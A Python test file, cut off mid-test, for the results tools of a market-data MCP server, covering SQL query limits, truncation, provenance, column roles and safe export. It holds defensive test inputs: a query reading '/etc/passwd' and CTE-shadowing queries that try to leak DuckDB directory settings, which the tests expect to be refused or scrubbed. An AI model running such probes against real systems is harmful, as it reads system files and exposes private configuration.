"""The results tools (contract 5.5): results_query, results_describe,
results_sample, results_list, results_drop and results_export."""

from __future__ import annotations

import asyncio
import datetime as dt
import inspect
import json
import os
import pathlib
import re
import time

import pyarrow as pa
import pyarrow.csv as pacsv
import pyarrow.parquet as pq
import pytest
from coresupport import bar_rows, bar_table, news_rows, provenance, quote_rows, run

from marketlens_mcp.plugin_api import ToolError
from marketlens_mcp.results import tools as rt
from marketlens_mcp.results.arrow import rows_to_table
from marketlens_mcp.results.store import StoreLimits, StoreRoot
from marketlens_mcp.results_api import ColumnInfo, InlineResult, ResultInfo, ResultMarker, RowsOf
from marketlens_mcp.testing import call_tool, make_context
from marketlens_schema.market import Bar, NewsItem, StockExchange

SPECS = {s.name: s for s in rt.SPECS}


@pytest.fixture
def setup(tmp_path):
    root = StoreRoot(tmp_path / "cache", StoreLimits(export_dir=str(tmp_path / "out")))
    (tmp_path / "out").mkdir()
    store = root.session("s")
    bars = store.put(
        bar_table(n=400),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
    )
    small = store.put(
        rows_to_table(bar_rows(n=5), Bar),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
    )
    news = store.put(
        rows_to_table(news_rows(), NewsItem),
        tool="news_search",
        model=NewsItem.schema_name,
        provenance=provenance(),
        risk="external_text",
    )
    ctx = make_context(store=store, settings={"export_dir": str(tmp_path / "out")})
    return ctx, store, bars, small, news, tmp_path


def call(ctx, name, **kw):
    return run(call_tool(SPECS[name], ctx, **kw))


def test_six_specs_with_their_capabilities():
    assert {n: s.capability for n, s in SPECS.items()} == {
        "results_query": "results",
        "results_describe": "results",
        "results_sample": "results",
        "results_list": "results",
        "results_drop": "results",
        "results_export": "results.export",
    }
    for s in SPECS.values():
        assert s.provider == "local"
        assert s.golden_test == "tests/core/test_results_tools.py"


def test_query_inline(setup):
    ctx, _, bars, *_ = setup
    out = call(
        ctx,
        "results_query",
        sql=f"SELECT ticker, count(*) AS n FROM {bars.result_id} GROUP BY ticker ORDER BY ticker",
    )
    assert isinstance(out, InlineResult)
    assert out.model == "marketlens.QueryRow"
    assert out.rows == [
        {"ticker": "AAPL", "n": 400},
        {"ticker": "MSFT", "n": 400},
        {"ticker": "NVDA", "n": 400},
    ]
    assert [c.type for c in out.columns] == ["VARCHAR", "BIGINT"]
    assert out.provenance.provider == "marketlens"
    assert out.provenance.route == "duckdb:results_query"
    assert out.provenance.derived_from == [bars.result_id]
    assert any(n.startswith("Executed: SELECT") and "LIMIT 51" in n for n in out.notes)
    assert "Truncated: no" in out.notes


def test_query_default_limit_and_truncation_note(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT ticker, t FROM {bars.result_id}")
    assert out.row_count == 50
    assert any(n.startswith("Truncated: yes") for n in out.notes)


def test_query_max_rows_bounds(setup):
    """max_rows above results.query_max_rows was refused although the
    description said a larger LIMIT is lowered: it is lowered too, with a note."""
    ctx, _, bars, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="SELECT 1", max_rows=0)
    assert info.value.code == "invalid_arguments"
    out = call(ctx, "results_query", sql=f"SELECT ticker FROM {bars.result_id}", max_rows=500)
    assert isinstance(out, InlineResult) and out.row_count == 200
    assert any(
        "max_rows 500 is above results.query_max_rows (200), so it was lowered" in n for n in out.notes
    )
    assert any(n.startswith("Truncated: yes; more than 200 rows") for n in out.notes)


def test_query_byte_cap_offloads_its_own_result(setup):
    """N5: an answer too large to show is stored whole, not cut to max_rows
    (it was: 200 of 1,200 rows, one ticker of three, marked complete)."""
    ctx, store, bars, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)
    assert isinstance(out, ResultMarker)
    assert out.model == "marketlens.QueryRow"
    assert out.parents == [bars.result_id]
    assert out.row_count == store.info(out.result_id).row_count == 1200
    assert out.preview.groups_sample == ["AAPL", "MSFT", "NVDA"]
    assert out.provenance.derived_from == [bars.result_id]
    assert (out.provenance.truncated, out.provenance.truncation_note) == (False, None)
    assert "Truncated: no" in out.notes and any("LIMIT 50001" in n for n in out.notes)
    assert any(
        n.startswith("The answer (its first 200 rows alone: ")
        and "so all 1200 rows were stored as a new result" in n
        for n in out.notes
    )
    described = call(ctx, "results_describe", result_id=out.result_id)
    assert (described.row_count, described.provenance.truncated, described.notes) == (1200, False, [])
    # An answer that is whole at max_rows is stored as it is, without running again.
    whole = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id} LIMIT 150", max_rows=200)
    assert whole.row_count == 150 and any("LIMIT 150" in n for n in whole.notes)
    assert any(n.startswith("The answer (150 rows,") for n in whole.notes)


def test_a_cut_answer_says_truncated_in_its_provenance_and_describe(tmp_path):
    """N5: an answer cut at its cap is flagged truncated in provenance, which a
    stored answer keeps (describe repeats the note, analytics carry it); it
    was false, so describe and analytics treated the answer as complete."""
    root = StoreRoot(tmp_path / "cache", StoreLimits(fetch_max_rows=500))
    store = root.session("s")
    bars = store.put(
        bar_table(n=400),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
    )
    ctx = make_context(store=store)
    for kw in ({"store": True}, {"max_rows": 200}):
        out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", **kw)
        assert isinstance(out, ResultMarker) and out.row_count == 500, kw
        assert out.provenance.truncated is True, kw
        assert out.provenance.truncation_note.startswith(
            "The answer is cut: more than 500 rows matched and only the first 500 are kept."
        )
        assert "fetch.max_rows (500) bounds a stored one" in out.provenance.truncation_note
        assert any(n.startswith("Truncated: yes; more than 500 rows matched") for n in out.notes)
        described = call(ctx, "results_describe", result_id=out.result_id)
        assert described.provenance.truncated is True
        assert described.notes == [out.provenance.truncation_note]
    assert any("so its first 500 rows were stored" in n for n in out.notes)
    inline = call(ctx, "results_query", sql=f"SELECT ticker FROM {bars.result_id}")
    assert isinstance(inline, InlineResult) and inline.row_count == 50
    assert inline.provenance.truncated is True
    assert "use store=true" in inline.provenance.truncation_note
    complete = call(ctx, "results_query", sql=f"SELECT count(*) AS n FROM {bars.result_id}")
    assert (complete.provenance.truncated, complete.provenance.truncation_note) == (False, None)


def test_query_store_true_keeps_up_to_fetch_max_rows_and_handles_compose(setup):
    ctx, store, bars, small, *_ = setup
    out = call(
        ctx,
        "results_query",
        sql=f"SELECT ticker, t, close FROM {bars.result_id} WHERE ticker = 'AAPL'",
        store=True,
    )
    assert isinstance(out, ResultMarker) and out.row_count == 400
    second = call(
        ctx,
        "results_query",
        sql=f"SELECT count(*) AS n FROM {out.result_id} a JOIN {small.result_id} b USING (ticker, t)",
    )
    assert second.rows == [{"n": 5}]
    assert set(second.provenance.derived_from) == {out.result_id, small.result_id}


def test_query_store_true_keeps_the_parents_time_series_columns_and_units(setup):
    ctx, store, bars, small, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id} WHERE ticker = 'AAPL'", store=True)
    info = store.info(out.result_id)
    assert (info.model, info.time_column, info.group_column) == ("marketlens.QueryRow", "t", "ticker")
    units = {c.name: c.unit for c in info.columns}
    assert units["close"] == {c.name: c.unit for c in bars.columns}["close"] == "price"
    # Only what is still there unchanged: the series column renamed, the time column cast or two parents.
    renamed = store.info(
        call(
            ctx, "results_query", sql=f"SELECT ticker AS sym, t, close FROM {bars.result_id}", store=True
        ).result_id
    )
    assert (renamed.time_column, renamed.group_column) == ("t", None)
    for sql in (
        f"SELECT ticker, CAST(t AS VARCHAR) AS t, close FROM {bars.result_id}",
        f"SELECT ticker, t AS ts, close FROM {bars.result_id}",
        f"SELECT a.ticker, a.t, a.close FROM {bars.result_id} a JOIN {small.result_id} b USING (ticker, t)",
    ):
        kept = store.info(call(ctx, "results_query", sql=sql, store=True).result_id)
        # Bars joined row for row on t keep it as their time column (review of round 9), never units.
        assert (kept.time_column, kept.group_column) == ("t" if "JOIN" in sql else None, None), sql
        assert all(c.unit is None for c in kept.columns), sql


def test_a_stored_answer_records_the_model_its_columns_came_from(setup):
    """A column a stored answer keeps with its unit records the model of the
    result that computed it (source_model), through a query of a query, so it
    is known after that result is gone (analytics_volatility tells a drawdown
    from returns by it); other columns' JSON has no source_model."""
    ctx, store, bars, *_ = setup
    first = call(ctx, "results_query", sql=f"SELECT ticker, t, close FROM {bars.result_id}", store=True)
    second = call(ctx, "results_query", sql=f"SELECT * FROM {first.result_id}", store=True)
    store.drop(first.result_id)
    third = call(ctx, "results_query", sql=f"SELECT * FROM {second.result_id}", store=True)
    assert {c.name: c.source_model for c in store.info(third.result_id).columns} == {
        "ticker": None,
        "t": "marketlens.Bar",
        "close": "marketlens.Bar",
    }
    shown = {c["name"]: c for c in third.model_dump(mode="json")["columns"]}
    assert shown["close"]["source_model"] == "marketlens.Bar" and "source_model" not in shown["ticker"]
    # An answer that recorded none (stored before source_model was): a query of
    # it records none either, not that answer's own model, marketlens.QueryRow.
    unrecorded = store.put(
        store.read(second.result_id, limit=1000),
        tool="results_query",
        model="marketlens.QueryRow",
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
        column_units={"t": "UTC", "close": "price"},
        parents=[second.result_id],
    )
    fourth = call(ctx, "results_query", sql=f"SELECT * FROM {unrecorded.result_id}", store=True)
    assert {c.name: (c.unit, c.source_model) for c in store.info(fourth.result_id).columns} == {
        "ticker": (None, None),
        "t": ("UTC", None),
        "close": ("price", None),
    }


def test_a_columns_json_schema_describes_its_fields_where_source_model_is_left_out():
    """source_model and role are left out of a column's JSON when None, and the
    JSON Schema of a column, alone or in a result, still lists every field in
    serialization mode as in validation mode (not an opaque object)."""
    bare = ColumnInfo(name="x", type="DOUBLE").model_dump(mode="json")
    assert "source_model" not in bare and "role" not in bare
    kept = ColumnInfo(name="x", type="DOUBLE", source_model="marketlens.Bar").model_dump(mode="json")
    assert kept["source_model"] == "marketlens.Bar"
    clock = ColumnInfo(name="k", type="TIMESTAMP WITH TIME ZONE", role="available").model_dump(mode="json")
    assert clock["role"] == "available"
    for model in (ColumnInfo, ResultInfo, ResultMarker, InlineResult):
        for mode in ("validation", "serialization"):
            schema = model.model_json_schema(mode=mode)
            column = schema if model is ColumnInfo else schema["$defs"]["ColumnInfo"]
            assert set(column.get("properties", {})) == set(ColumnInfo.model_fields), (model.__name__, mode)


def test_query_over_news_is_external_text(setup):
    ctx, _, _, _, news, _ = setup
    from marketlens_mcp import pipeline

    done = run(
        pipeline.execute(SPECS["results_query"], ctx, {"sql": f"SELECT headline FROM {news.result_id}"})
    )
    assert isinstance(done.response, InlineResult)
    assert done.risk == "external_text"
    bars_id = setup[2].result_id
    done = run(pipeline.execute(SPECS["results_query"], ctx, {"sql": f"SELECT count(*) FROM {bars_id}"}))
    assert done.risk == "api_structured"
    done = run(pipeline.execute(SPECS["results_sample"], ctx, {"result_id": news.result_id}))
    assert done.risk == "external_text"
    done = run(pipeline.execute(SPECS["results_describe"], ctx, {"result_id": news.result_id}))
    assert done.risk == "external_text"


def test_query_refusals_become_tool_errors(setup):
    ctx, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="DROP TABLE x")
    assert info.value.code == "sql_not_select"
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="SELECT * FROM read_csv('/etc/passwd')")
    assert info.value.code == "sql_function"


def test_a_refusals_hint_reaches_the_tool_error(setup):
    ctx, _, bars, *_ = setup
    sql = (
        f"WITH h AS (SELECT ticker FROM {bars.result_id}),\n"
        f"map AS (SELECT ticker, close FROM {bars.result_id})\n"
        "SELECT h.ticker, map.close FROM h JOIN map ON h.ticker = map.ticker"
    )
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql=sql)
    assert info.value.code == "sql_parse"
    assert info.value.message == "The SQL does not parse: Expecting (. Line 3, Col: 21."
    assert "map is a SQL keyword here" in info.value.hint
    assert "'map'" not in info.value.hint


LEAKY = (
    "('secret_directory', 'allowed_directories', 'temp_directory', 'home_directory', 'extension_directory')"
)


@pytest.mark.parametrize(
    "sql",
    [
        f"SELECT name, setting FROM (WITH pg_settings AS (SELECT 1) SELECT 1) q, pg_settings WHERE name IN {LEAKY}",
        f"SELECT name, setting FROM pg_settings WHERE name IN {LEAKY} AND EXISTS (WITH pg_settings AS (SELECT 1) SELECT 1)",
        f"WITH pg_settings AS (SELECT * FROM pg_settings) SELECT name, setting FROM pg_settings WHERE name IN {LEAKY}",
        f"WITH RECURSIVE pg_settings AS (SELECT name, setting FROM pg_settings WHERE name IN {LEAKY} "
        "UNION SELECT 'cte', 'cte') SELECT * FROM pg_settings",
        f"WITH RECURSIVE pg_settings AS (SELECT 'secret_directory' AS name INTERSECT SELECT name FROM pg_settings "
        f"WHERE name IN {LEAKY}) SELECT * FROM pg_settings",
        "WITH c AS (SELECT 1 AS k) SELECT name, setting FROM pg_settings, c AS pg_settings "
        f"WHERE name IN {LEAKY} AND EXISTS (WITH pg_settings AS (SELECT 1) SELECT 1)",
        "SELECT * FROM (WITH duckdb_databases AS (SELECT 1) SELECT 1) q, duckdb_databases",
        "SELECT * FROM (WITH pragma_database_list AS (SELECT 1) SELECT 1) q, pragma_database_list",
        "SELECT * FROM (WITH sqlite_master AS (SELECT 1) SELECT 1) q, sqlite_master",
        f"SELECT name, setting FROM pg_settings WHERE name IN {LEAKY}",
        "SELECT * FROM duckdb_databases",
        "SELECT ticker, count(*) AS n FROM {bars} GROUP BY ticker",
        "WITH x AS (SELECT * FROM {bars}) SELECT * FROM x ORDER BY t LIMIT 3",
    ],
    ids=lambda s: s[:50],
)
def test_no_query_output_carries_an_absolute_path(setup, sql):
    """Whatever results_query sends back (rows, columns, notes or the refusal)
    never names a filesystem path: the cache, the home folder or the cwd."""
    ctx, _, bars, _, _, tmp_path = setup
    roots = [str(tmp_path), str(pathlib.Path.home()), os.getcwd(), str(tmp_path.resolve())]
    pattern = re.compile(r"(?<![\w.\-~:])/(?:Users|home|private|var|tmp|etc|opt|Volumes|root)/")
    try:
        out = call(ctx, "results_query", sql=sql.replace("{bars}", bars.result_id), max_rows=200)
    except ToolError as exc:
        text = f"{exc.code} {exc.message} {exc.hint}"
    else:
        text = out.model_dump_json()
    leaked = [r for r in roots if r and r in text] + pattern.findall(text)
    assert leaked == [], text[:500]


def test_describe_returns_the_marker_without_a_new_result(setup):
    ctx, store, bars, *_ = setup
    before = len(store.list())
    out = call(ctx, "results_describe", result_id=bars.result_id)
    assert isinstance(out, ResultMarker) and out.result_id == bars.result_id
    assert len(store.list()) == before


def test_describe_unknown_is_r15(setup):
    ctx, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_describe", result_id="r_0000000000")
    assert info.value.code == "result_unknown"


@pytest.mark.parametrize("method", ["first", "last", "random"])
def test_sample(setup, method):
    ctx, _, bars, *_ = setup
    out = call(
        ctx, "results_sample", result_id=bars.result_id, n=5, method=method, columns=["ticker", "t", "close"]
    )
    assert isinstance(out, InlineResult)
    assert out.row_count == 5
    assert set(out.rows[0]) == {"ticker", "t", "close"}
    assert out.provenance.route == "duckdb:results_sample"
    if method == "first":
        assert out.rows[0]["t"] == "2026-01-05T14:30:00Z"


def test_sample_random_is_repeatable(setup):
    ctx, _, bars, *_ = setup
    a = call(ctx, "results_sample", result_id=bars.result_id, n=5, method="random")
    b = call(ctx, "results_sample", result_id=bars.result_id, n=5, method="random")
    assert a.rows == b.rows


def test_sample_unknown_column_names_the_available_ones(setup):
    ctx, _, bars, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_sample", result_id=bars.result_id, columns=["nope"])
    assert info.value.code == "unknown_column"
    assert "close" in info.value.message


def test_sample_shrinks_to_the_byte_cap(tmp_path):
    root = StoreRoot(tmp_path / "cache", StoreLimits(query_max_bytes=1000))
    store = root.session("s")
    news = store.put(
        rows_to_table([r.model_copy(update={"headline": "x" * 400}) for r in news_rows(10)], NewsItem),
        tool="news_search",
        model=NewsItem.schema_name,
        provenance=provenance(),
        risk="external_text",
    )
    out = call(make_context(store=store), "results_sample", result_id=news.result_id, n=10)
    assert out.row_count < 10
    assert any("fewer rows" in n for n in out.notes)
    assert len(json.dumps(out.rows)) <= 1000


def test_list_is_newest_first(setup):
    ctx, store, bars, small, news, _ = setup
    out = call(ctx, "results_list")
    assert isinstance(out, InlineResult)
    assert [r["result_id"] for r in out.rows] == [i.result_id for i in store.list()]
    assert set(out.rows[0]) == {"result_id", "tool", "model", "row_count", "created_at", "expires_at", "risk"}


def test_drop(setup):
    ctx, store, bars, *_ = setup
    out = call(ctx, "results_drop", result_id=bars.result_id)
    assert out.rows == [{"result_id": bars.result_id, "dropped": True}]
    again = call(ctx, "results_drop", result_id=bars.result_id)
    assert again.rows == [{"result_id": bars.result_id, "dropped": False}]


@pytest.mark.parametrize("fmt", ["csv", "parquet"])
def test_export_writes_only_under_the_export_dir(setup, fmt):
    ctx, _, _, small, _, tmp_path = setup
    out = call(ctx, "results_export", result_id=small.result_id, format=fmt, file_name="bars")
    row = out.rows[0]
    assert row == {
        "result_id": small.result_id,
        "file_name": f"bars.{fmt}",
        "format": fmt,
        "rows": 15,
        "bytes": (tmp_path / "out" / f"bars.{fmt}").stat().st_size,
    }
    target = tmp_path / "out" / f"bars.{fmt}"
    table = pacsv.read_csv(target) if fmt == "csv" else pq.read_table(target)
    assert table.num_rows == 15
    assert str(tmp_path) not in json.dumps(out.model_dump(mode="json"))


def test_export_refuses_overwrite_and_bad_names(setup):
    ctx, _, _, small, _, _ = setup
    call(ctx, "results_export", result_id=small.result_id, format="csv", file_name="x")
    with pytest.raises(ToolError) as info:
        call(ctx, "results_export", result_id=small.result_id, format="csv", file_name="x")
    assert info.value.code == "export_exists"
    call(ctx, "results_export", result_id=small.result_id, format="csv", file_name="x", overwrite=True)
    for bad in ("../x", "a/b", "", ".", "..", "x" * 65):
        with pytest.raises(ToolError) as info:
            call(ctx, "results_export", result_id=small.result_id, format="csv", file_name=bad)
        assert info.value.code == "invalid_arguments"


def test_export_without_a_folder(store):
    info = store.put(
        rows_to_table(bar_rows(n=2), Bar), tool="t", model=Bar.schema_name, provenance=provenance()
    )
    with pytest.raises(ToolError) as e:
        call(make_context(store=store), "results_export", result_id=info.result_id, format="csv")
    assert e.value.code == "export_dir_missing"


def test_query_answers_whole_number_sums_as_numbers(setup):
    """sum() over integers is a HUGEINT, which came back as the string '1008'
    next to count(*)'s 1008; exact decimals stay strings."""
    ctx, _, bars, *_ = setup
    sql = (
        f"SELECT sum(CASE WHEN close > 0 THEN 1 ELSE 0 END) AS s, count(*) AS c, "
        f"CAST(1.25 AS DECIMAL(10, 2)) AS d, CAST(9223372036854775808 AS HUGEINT) AS huge "
        f"FROM {bars.result_id}"
    )
    out = call(ctx, "results_query", sql=sql)
    # Beyond BIGINT a whole number stays an exact string.
    assert out.rows == [{"s": 1200, "c": 1200, "d": "1.25", "huge": "9223372036854775808"}]
    assert [c.type for c in out.columns] == ["BIGINT", "BIGINT", "DECIMAL(10,2)", "DECIMAL(38,0)"]
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert [c.type for c in stored.columns][:2] == ["BIGINT", "BIGINT"]


def test_query_of_a_dropped_result_says_it_was_dropped(setup):
    """results_query of a dropped result gave sql_table (not one of this
    session's results) where results_describe gave result_dropped."""
    ctx, _, bars, small, *_ = setup
    call(ctx, "results_drop", result_id=small.result_id)
    for name in ("results_query", "results_describe"):
        arguments = {"sql": f"SELECT count(*) FROM {small.result_id}"} if name == "results_query" else {}
        with pytest.raises(ToolError) as info:
            call(ctx, name, **(arguments or {"result_id": small.result_id}))
        assert info.value.code == "result_dropped", name
        assert small.result_id in info.value.message
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="SELECT * FROM r_00000000ff")
    assert info.value.code == "sql_table" and bars.result_id in info.value.message


def test_query_refuses_pivot_with_the_way_round_it(setup):
    ctx, _, bars, *_ = setup
    for sql in (
        f"PIVOT {bars.result_id} ON ticker USING last(close) GROUP BY t",
        f"SELECT * FROM (PIVOT {bars.result_id} ON ticker USING last(close) GROUP BY t) LIMIT 2",
    ):
        with pytest.raises(ToolError) as info:
            call(ctx, "results_query", sql=sql)
        assert info.value.code == "sql_forbidden"
        assert (
            "PIVOT and UNPIVOT are not allowed" in info.value.message
            and "FILTER (WHERE" in info.value.message
        )


def test_query_stored_for_size_says_which_limit_and_the_description_names_the_limits(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)
    assert isinstance(out, ResultMarker)
    assert any("bytes as JSON) is larger than results.query_max_bytes (24,000 bytes)" in n for n in out.notes)
    text = SPECS["results_query"].description
    for words in (
        "PIVOT and UNPIVOT are not",
        "at most 8 results",
        "24,000 bytes",
        "decimals come back as strings",
    ):
        assert words in text


def test_a_columns_role_comes_from_its_field_metadata_and_a_stored_answer_keeps_it(setup):
    """A dynamic table marks the column of when each row became known
    ({b"role": b"available"}); the stored result's column carries the role, and
    so does an answer over it that keeps the column unchanged (the time column
    kept), so analytics_align matches it point in time; a role marketlens does
    not know is ignored."""
    ctx, store, *_ = setup
    ts = pa.timestamp("us", tz="UTC")
    schema = pa.schema(
        [
            pa.field("event_time", ts),
            pa.field("knowledge_time", ts, metadata={b"unit": b"UTC", b"role": b"available"}),
            pa.field("ingested_at", ts, metadata={b"role": b"stored"}),
            pa.field("value", pa.float64()),
        ]
    )
    t0 = dt.datetime(2026, 1, 5, tzinfo=dt.UTC)
    table = pa.table([[t0], [t0 + dt.timedelta(days=1)], [t0], [1.0]], schema=schema)
    known = store.put(
        table,
        tool="datastore_query",
        model="marketlens.QueryRow",
        provenance=provenance(),
        time_column="event_time",
    )
    roles = {c.name: c.role for c in known.columns}
    assert roles == {"event_time": None, "knowledge_time": "available", "ingested_at": None, "value": None}
    shown = {
        c["name"]: c
        for c in call(ctx, "results_describe", result_id=known.result_id).model_dump(mode="json")["columns"]
    }
    assert shown["knowledge_time"]["role"] == "available" and "role" not in shown["value"]
    kept = call(
        ctx,
        "results_query",
        sql=f"SELECT event_time, knowledge_time, value FROM {known.result_id}",
        store=True,
    )
    assert {c.name: c.role for c in store.info(kept.result_id).columns}["knowledge_time"] == "available"
    cast = call(
        ctx,
        "results_query",
        sql=f"SELECT event_time, CAST(knowledge_time AS VARCHAR) AS knowledge_time FROM {known.result_id}",
        store=True,
    )
    assert all(c.role is None for c in store.info(cast.result_id).columns)
    assert any(n.startswith(f"The answer leaves out knowledge_time of {known.result_id}") for n in cast.notes)


def test_an_answer_over_a_cut_result_says_truncated_too(tmp_path):
    """Review of N5: a query over an incomplete result is incomplete too; it
    said truncated=false and "Truncated: no", so describe and analytics took a
    count over MSFT's first 100 of 400 bars for the whole."""
    store = StoreRoot(tmp_path / "cache", StoreLimits(fetch_max_rows=500)).session("s")
    bars = store.put(
        bar_table(n=400),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
    )
    ctx = make_context(store=store)
    cut = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id} ORDER BY ticker, t", store=True)
    assert cut.row_count == 500 and cut.provenance.truncated is True
    note = (
        f"Computed from {cut.result_id}, which is incomplete (truncated: results_describe says where it stopped), "
        "so this answer may be incomplete too."
    )
    over = call(ctx, "results_query", sql=f"SELECT * FROM {cut.result_id} ORDER BY ticker, t", max_rows=200)
    assert isinstance(over, ResultMarker) and over.row_count == 500
    assert (over.provenance.truncated, over.provenance.truncation_note) == (True, note)
    assert f"Truncated: yes; {note}" in over.notes and "Truncated: no" not in over.notes
    assert call(ctx, "results_describe", result_id=over.result_id).notes == [note]
    counts = call(
        ctx,
        "results_query",
        sql=f"SELECT ticker, count(*) AS n FROM {cut.result_id} GROUP BY ticker ORDER BY ticker",
    )
    assert isinstance(counts, InlineResult) and counts.rows == [
        {"ticker": "AAPL", "n": 400},
        {"ticker": "MSFT", "n": 100},
    ]
    assert (counts.provenance.truncated, counts.provenance.truncation_note) == (True, note)
    # Cut itself and over a cut result: both said.
    both = call(
        ctx,
        "results_query",
        sql=f"SELECT b.ticker, b.t, c.close FROM {bars.result_id} b LEFT JOIN {cut.result_id} c USING (ticker, t)",
        store=True,
    )
    assert both.provenance.truncated is True and both.provenance.truncation_note.endswith(note)
    assert both.provenance.truncation_note.startswith("The answer is cut: more than 500 rows matched")
    whole = call(ctx, "results_query", sql=f"SELECT count(*) AS n FROM {bars.result_id}")
    assert (whole.provenance.truncated, whole.notes[-1]) == (False, "Truncated: no")


def _known_result(store):
    ts = pa.timestamp("us", tz="UTC")
    schema = pa.schema(
        [
            pa.field("event_time", ts),
            pa.field("knowledge_time", ts, metadata={b"unit": b"UTC", b"role": b"available"}),
            pa.field("value", pa.float64()),
        ]
    )
    t0 = dt.datetime(2026, 1, 5, tzinfo=dt.UTC)
    days = [t0 + dt.timedelta(days=i) for i in range(3)]
    table = pa.table([days, [d + dt.timedelta(hours=46) for d in days], [1.0, 2.0, 3.0]], schema=schema)
    return store.put(
        table,
        tool="datastore_query",
        model="marketlens.QueryRow",
        provenance=provenance(),
        time_column="event_time",
    )


def test_a_columns_role_survives_a_join_and_a_new_time_column_and_a_dropped_one_is_named(setup):
    """Review of N2: the role of when each row became known is kept on any
    column a stored answer keeps with its name and type, from any result it
    read and whatever its time column: it was kept only by a query of one
    result that kept its time column, so a join or a time_bucket silently gave
    analytics_align an answer it matched on event time. A stored answer that
    leaves the column out says so."""
    from marketlens_schema.market import Quote

    ctx, store, *_ = setup
    known = _known_result(store)
    quotes = store.put(
        rows_to_table(quote_rows(), Quote),
        tool="market_quotes",
        model=Quote.schema_name,
        provenance=provenance(),
    )

    def roles(out):
        return {c.name: c.role for c in store.info(out.result_id).columns}

    joined = call(
        ctx,
        "results_query",
        sql=f"SELECT k.*, q.t, q.bid_price FROM {known.result_id} k ASOF JOIN {quotes.result_id} q "
        "ON k.event_time >= q.t",
        store=True,
    )
    assert roles(joined) == {
        "event_time": None,
        "knowledge_time": "available",
        "value": None,
        "t": None,
        "bid_price": None,
    }
    # The quotes' time is the answer's: a joined row is matched no earlier than its quote.
    assert store.info(joined.result_id).time_column == "t"
    bucketed = call(
        ctx,
        "results_query",
        sql=f"SELECT time_bucket(INTERVAL 2 DAY, event_time) AS day, max(knowledge_time) AS knowledge_time, "
        f"avg(value) AS value FROM {known.result_id} GROUP BY 1",
        store=True,
    )
    assert roles(bucketed)["knowledge_time"] == "available"
    assert not any("leaves out" in n for n in joined.notes + bucketed.notes)
    # Review of round 9: an answer leaving the clock out was matched on its
    # time column; nothing shows when its rows became known, so it is refused.
    for sql in (
        f"SELECT event_time, value FROM {known.result_id}",
        f"SELECT event_time, knowledge_time AS published, value FROM {known.result_id}",
    ):
        dropped = call(ctx, "results_query", sql=sql, store=True)
        assert all(r is None for r in roles(dropped).values())
        assert store.info(dropped.result_id).rows_of == RowsOf(
            model="marketlens.QueryRow", fetched_at=known.provenance.fetched_at, shown=False
        )
        assert (
            f"The answer leaves out knowledge_time of {known.result_id} (role available: when each row became "
            "known), so analytics_align refuses the answer unless match_on=time, as nothing shows when its rows "
            "became known; keep the column, with its name and type, to match point in time."
        ) in dropped.notes
    inline = call(ctx, "results_query", sql=f"SELECT event_time, value FROM {known.result_id}")
    assert isinstance(inline, InlineResult) and not any("leaves out" in n for n in inline.notes)


def test_a_clock_the_query_computes_keeps_no_role(setup):
    """Review of N2: the role was kept on any column with the name and type of
    one, so min(knowledge_time) of a week, aliased back, said when the week's
    rows became known, and analytics_align matched a bar to an average of days
    published after it. A clock keeps its role only passed through (through
    a CTE too), or as max() or greatest() of clocks, with every result read
    that has one feeding it. Round 8: a week's bucket dated at its start
    (min(knowledge_time) beside it) shows not when its rows became known, so
    analytics_align refuses it; a clock computed beside rows dated as theirs
    is matched on as a lower bound. Review of round 9: a clock the query
    computes is no lower bound (a date_trunc of it, an hour earlier, the
    event time renamed so: every bar got a value published after it), nor is
    one side's clock of a join (the other side's values may be known later):
    refused too, also where the answer repeats the name and the computed
    column comes first (the real clock renamed knowledge_time_1)."""
    ctx, store, *_ = setup
    known, other = _known_result(store), _known_result(store)
    k, o = known.result_id, other.result_id

    def role(sql):
        out = call(ctx, "results_query", sql=sql, store=True)
        info = store.info(out.result_id)
        return {c.name: c.role for c in info.columns}["knowledge_time"], out.notes, info.rows_of

    week = "time_bucket(INTERVAL 7 DAY, event_time) AS event_time, avg(value) AS value"
    why = (
        "The answer's knowledge_time keeps no role available (when each row became known): a query keeps it only "
        "on such a column passed through, or on max() or greatest() of such columns from every result read that "
        "has one, never earlier than any row's (min() of a week's, say, is earlier than some of the week's "
        "values). "
    )
    refused = why + (
        "analytics_align refuses the answer unless match_on=time, as nothing shows when its rows became known."
    )
    for sql in (
        f"SELECT {week}, min(knowledge_time) AS knowledge_time FROM {k} GROUP BY ALL",
        f"SELECT event_time, time_bucket(INTERVAL 1 DAY, knowledge_time) AS knowledge_time FROM {k}",
        f"SELECT event_time, date_trunc('day', knowledge_time) AS knowledge_time, value FROM {k}",
        f"SELECT event_time, knowledge_time - INTERVAL 1 HOUR AS knowledge_time, value FROM {k}",
        f"SELECT event_time, least(knowledge_time, event_time) AS knowledge_time, value FROM {k}",
        f"SELECT event_time, event_time AS knowledge_time, value FROM {k}",
        f"SELECT knowledge_time - INTERVAL 2 DAY AS knowledge_time, * FROM {k}",
        f"WITH w AS (SELECT {week}, min(knowledge_time) AS knowledge_time FROM {k} GROUP BY ALL) SELECT * FROM w",
        # A join keeping one side's clock: the other side's values may be known later.
        f"SELECT a.event_time, a.value, b.value AS b_value, a.knowledge_time FROM {k} a JOIN {o} b USING (event_time)",
    ):
